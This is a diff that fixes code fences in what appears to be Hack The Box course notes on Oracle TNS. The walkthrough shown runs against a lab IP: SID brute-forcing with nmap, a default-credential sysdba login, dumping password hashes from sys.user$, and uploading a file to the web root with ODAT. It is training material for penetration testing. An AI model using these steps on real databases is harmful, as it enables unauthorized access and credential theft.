@@ -106,8 +106,7 @@ Before we can enumerate the TNS listener and interact with it, we need to downlo
 
 #### Setting up - ODAT
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo apt-get update
 sudo apt-get install -y build-essential python3-dev libaio1
 cd ~
@@ -148,8 +147,7 @@ After that, we can try to determine if the installation was successful by runnin
 
 #### Testing ODAT
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ./odat.py -h
 
 usage: odat.py [-h] [--version]
@@ -177,8 +175,7 @@ Let's now use `nmap` to scan the default Oracle TNS listener port.
 
 #### Nmap
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open
 
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
@@ -200,8 +197,7 @@ There are various ways to enumerate, or better said, guess SIDs. Therefore we ca
 
 #### Nmap - SID Bruteforcing
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
 
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
@@ -221,8 +217,7 @@ We can use the `odat.py` tool to perform a variety of scans to enumerate and gat
 
 #### ODAT
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ./odat.py all -s 10.129.204.235
 
 [+] Checking if target 10.129.204.235:1521 is well configured for a connection...
@@ -244,8 +239,7 @@ Before we can use `sqlplus` on our `Pwnbox`, we need to update and upgrade `parr
 
 #### Setting up - SQLplus
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo apt update
 sudo apt upgrade parrot-core
 sudo apt update
@@ -270,15 +264,13 @@ Launchers are updated
 
 If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
 ```
 
 Finally, we can execute `sqlplus -v` to check if the tool will be executed without errors.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sqlplus -v
 
 SQL*Plus: Release 19.0.0.0.0 - Production
@@ -287,8 +279,7 @@ Version 19.6.0.0.0
 
 #### SQLplus - Log In
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE
 
 SQL*Plus: Release 19.0.0.0.0 - Production
@@ -309,8 +300,7 @@ There are many [SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.11
 
 #### Oracle RDBMS - Interaction
 
-```
-        shellsession
+```shellsession
 SQL> select table_name from all_tables;
 
 TABLE_NAME
@@ -341,8 +331,7 @@ Here, the user `scott` has no administrative privileges. However, we can try usi
 
 #### Oracle RDBMS - Database Enumeration
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
 
 SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
@@ -380,8 +369,7 @@ We can follow many approaches once we get access to an Oracle database. It highl
 
 #### Oracle RDBMS - Extract Password Hashes
 
-```
-        shellsession
+```shellsession
 SQL> select name, password from sys.user$;
 
 NAME                           PASSWORD
@@ -416,8 +404,7 @@ First, trying our exploitation approach with files that do not look dangerous fo
 
 #### Oracle RDBMS - File Upload
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
 hiimeins@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
 
@@ -427,8 +414,7 @@ hiimeins@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger 
 
 Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
 
 Oracle File Upload Test
